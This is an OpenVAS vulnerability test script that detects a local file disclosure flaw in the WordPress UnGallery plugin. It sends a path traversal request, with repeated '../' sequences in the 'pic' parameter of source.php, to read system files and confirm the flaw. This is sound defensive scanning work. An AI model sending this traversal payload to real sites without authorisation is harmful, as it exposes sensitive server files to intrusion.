###############################################################################
# OpenVAS Vulnerability Test
# $Id: gb_wordpress_49259.nasl 11343 2018-09-12 06:36:46Z cfischer $
#
# WordPress UnGallery 'source_vuln.php' Local File Disclosure Vulnerability
#
# Authors:
# Michael Meyer <michael.meyer@greenbone.net>
#
# Copyright:
# Copyright (c) 2011 Greenbone Networks GmbH
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2
# (or any later version), as published by the Free Software Foundation.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

CPE = "cpe:/a:wordpress:wordpress";

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.103218");
  script_version("$Revision: 11343 $");
  script_tag(name:"last_modification", value:"$Date: 2018-09-12 08:36:46 +0200 (Wed, 12 Sep 2018) $");
  script_tag(name:"creation_date", value:"2011-08-22 16:04:33 +0200 (Mon, 22 Aug 2011)");
  script_bugtraq_id(49259);
  script_tag(name:"cvss_base", value:"5.0");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:P/I:N/A:N");
  script_name("WordPress UnGallery 'source_vuln.php' Local File Disclosure Vulnerability");
  script_category(ACT_ATTACK);
  script_family("Web application abuses");
  script_copyright("This script is Copyright (C) 2011 Greenbone Networks GmbH");
  script_dependencies("secpod_wordpress_detect_900182.nasl", "os_detection.nasl");
  script_require_ports("Services/www", 80);
  script_mandatory_keys("wordpress/installed");

  script_xref(name:"URL", value:"http://www.securityfocus.com/bid/49259");
  script_xref(name:"URL", value:"http://downloads.wordpress.org/plugin/");
  script_xref(name:"URL", value:"http://wordpress.org/");

  script_tag(name:"impact", value:"Exploiting this vulnerability would allow an attacker to obtain
  potentially sensitive information from local files on computers
  running the vulnerable application. This may aid in further attacks.");

  script_tag(name:"affected", value:"UnGallery versions 1.5.8 and prior are vulnerable.");

  script_tag(name:"summary", value:"The UnGallery plug-in for WordPress is prone to a local file-
  disclosure vulnerability because it fails to adequately validate user-supplied input.");

  script_tag(name:"solution", value:"No known solution was made available for at least one year since the disclosure
  of this vulnerability. Likely none will be provided anymore. General solution options are to upgrade to a newer
  release, disable respective features, remove the product or replace the product by another one.");

  script_tag(name:"qod_type", value:"remote_vul");
  script_tag(name:"solution_type", value:"WillNotFix");

  exit(0);
}

include("misc_func.inc");
include("http_func.inc");
include("host_details.inc");
include("http_keepalive.inc");

if(!port = get_app_port(cpe:CPE))exit(0);
if(!dir = get_app_location(cpe:CPE, port:port))exit(0);
if(dir == "/") dir = "";

files = traversal_files();

foreach file (keys(files)) {

  url = string(dir, "/wp-content/plugins/ungallery/source.php?pic=", crap(data:"../", length:3*9), files[file]);
  if(http_vuln_check(port:port, url:url, pattern:file)) {
    report = report_vuln_url(port:port, url:url);
    security_message(port:port, data:report);
    exit(0);
  }
}

exit(99);
